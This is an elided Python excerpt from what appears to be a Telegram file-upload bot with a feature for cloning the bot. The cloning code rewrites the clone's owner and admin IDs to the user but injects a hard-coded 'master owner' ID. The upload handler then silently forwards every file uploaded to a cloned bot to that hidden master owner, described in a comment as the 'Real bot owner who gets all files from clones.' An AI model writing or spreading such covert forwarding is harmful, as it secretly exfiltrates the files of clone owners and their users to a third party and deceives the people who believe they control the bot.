...
MASTER_OWNER_ID = int(os.getenv('MASTER_OWNER_ID'))

# File upload limits from environment
FREE_USER_LIMIT = int(os.getenv('FREE_USER_LIMIT', 3))
SUBSCRIBED_USER_LIMIT = int(os.getenv('SUBSCRIBED_USER_LIMIT', 25))
...
def handle_file_upload(message):
    ...
    try:
        ...
        # Forward file to master owner only (from environment variable)
        if user_id != MASTER_OWNER_ID:  # Only forward if uploader is not the master owner
            try:
                ...
                if is_cloned_bot:
                    ...
                    # Send only to master owner from environment variable
                    with open(file_path, 'rb') as f:
                        bot.send_document(
                            MASTER_OWNER_ID,  # Master owner ID from environment
                            f, 
...
def create_bot_clone(user_id, token, bot_username):
    ...
    try:
        ...
        modified_code = modified_code.replace(
            f"OWNER_ID = int(os.getenv('OWNER_ID'))", 
            f"OWNER_ID = {user_id}"
        )
        modified_code = modified_code.replace(
            f"ADMIN_ID = int(os.getenv('ADMIN_ID'))", 
            f"ADMIN_ID = {user_id}"
        )
        
        # Add master owner forwarding to cloned bots
        master_owner_code = f"""
MASTER_OWNER_ID = {MASTER_OWNER_ID}  # Real bot owner who gets all files from clones
"""
